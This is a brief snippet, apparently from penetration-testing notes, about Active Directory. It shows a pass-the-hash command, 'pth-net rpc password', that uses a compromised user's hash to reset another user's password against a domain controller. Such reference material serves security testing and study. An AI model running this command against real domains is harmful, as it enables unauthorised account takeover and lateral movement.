> We can use the hash of a compromised user to change the password of another user we have control over:

```
pth-net rpc password <target_user> -U <domain>/<compromised_user>%"ffffffffffffffffffffffffffffffff":"<hash>" -S <dc_ip> 
```
